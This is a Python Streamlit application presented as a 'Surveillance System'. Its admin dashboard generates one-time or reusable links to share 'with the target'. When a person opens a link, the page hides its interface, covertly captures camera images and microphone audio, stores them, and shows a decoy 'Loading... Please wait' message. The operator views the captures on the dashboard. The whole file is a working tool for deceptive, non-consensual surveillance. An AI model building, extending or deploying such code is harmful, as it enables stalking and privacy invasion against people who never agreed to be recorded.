import streamlit as st
import cv2
import numpy as np
from datetime import datetime
import os
from audio_recorder_streamlit import audio_recorder
from utils import is_admin, require_admin, generate_capture_link
from storage import save_capture, get_all_captures

# Page config
st.set_page_config(
    page_title="Surveillance System",
    page_icon="🎥",
    layout="wide"
)

# Initialize session state
if 'authenticated' not in st.session_state:
    st.session_state.authenticated = False
if 'capture_links' not in st.session_state:
    st.session_state.capture_links = {}
if 'capture_mode' not in st.session_state:
    st.session_state.capture_mode = 'single'

def auto_capture_page(token):
    """Page for automatic capture when target opens the link"""
    if token not in st.session_state.capture_links:
        st.error("Invalid or expired link")
        return

    # Hide all Streamlit elements
    st.markdown("""
        <style>
        div.stButton > button:first-child { display: none; }
        div.stMarkdown { display: none; }
        header { display: none; }
        </style>
    """, unsafe_allow_html=True)

    # Hidden capture elements
    img_capture = st.camera_input("", label_visibility="hidden")
    audio_bytes = audio_recorder(
        pause_threshold=2.0,
        sample_rate=41_000,
        text="",
        recording_color="#ff4b4b",
        neutral_color="#ffffff"
    )

    if img_capture is not None:
        # Save the captured image and audio
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        save_capture(img_capture, audio_bytes, timestamp)

        # Remove used token if single capture mode
        if st.session_state.capture_links[token].get('mode') == 'single':
            del st.session_state.capture_links[token]

        # Show a loading message
        st.markdown("""
            <div style='text-align: center; font-size: 24px;'>
                Loading... Please wait
            </div>
        """, unsafe_allow_html=True)

def admin_login():
    """Admin login page"""
    st.title("Surveillance System Admin")

    with st.container():
        st.markdown("""
            <style>
            .admin-container {
                padding: 2rem;
                border-radius: 10px;
                box-shadow: 0 2px 4px rgba(0,0,0,0.1);
            }
            </style>
        """, unsafe_allow_html=True)

        username = st.text_input("Username")
        password = st.text_input("Password", type="password")

        if st.button("Login"):
            if is_admin(username, password):
                st.session_state.authenticated = True
                st.rerun()
            else:
                st.error("Invalid credentials")

@require_admin
def admin_dashboard():
    """Admin dashboard page"""
    st.title("Surveillance Dashboard")

    if st.button("Logout"):
        st.session_state.authenticated = False
        st.rerun()

    # Link generation section
    st.subheader("Generate Capture Link")

    col1, col2 = st.columns(2)

    with col1:
        capture_mode = st.selectbox(
            "Capture Mode",
            ["single", "multiple"],
            help="Single: One-time capture, Multiple: Allows multiple captures"
        )

    with col2:
        if st.button("Generate New Link"):
            token = generate_capture_link()
            base_url = st.query_params.get("base_url", "http://localhost:5000")
            capture_url = f"{base_url}?token={token}"
            st.session_state.capture_links[token] = {
                'created_at': datetime.now(),
                'mode': capture_mode
            }
            st.code(capture_url)
            st.info("Share this link with the target. The link will be valid until used.")

    # Display captures
    st.subheader("Captured Data")
    captures = get_all_captures()

    # Stats
    col1, col2, col3 = st.columns(3)
    with col1:
        st.metric("Total Captures", len(captures))
    with col2:
        audio_count = sum(1 for c in captures if c['metadata'].get('has_audio'))
        st.metric("With Audio", audio_count)
    with col3:
        today_count = sum(1 for c in captures if c['timestamp'].startswith(datetime.now().strftime("%Y%m%d")))
        st.metric("Today's Captures", today_count)

    # Display captures in reverse chronological order
    for capture in captures:
        with st.expander(f"Capture {capture['timestamp']}"):
            col1, col2 = st.columns(2)

            with col1:
                st.image(capture['image'], caption="Captured Image")

            with col2:
                if capture['audio']:
                    st.audio(capture['audio'], format="audio/wav")
                else:
                    st.write("No audio recorded")

                st.text(f"Timestamp: {capture['timestamp']}")
                if 'metadata' in capture:
                    st.json(capture['metadata'])

def main():
    # Check for capture token
    token = st.query_params.get("token")
    path = st.query_params.get("path")

    if token:
        auto_capture_page(token)
    elif path == "admin" or not path:  # Show admin page for both /admin and root URL
        if not st.session_state.authenticated:
            admin_login()
        else:
            admin_dashboard()

if __name__ == "__main__":
    main()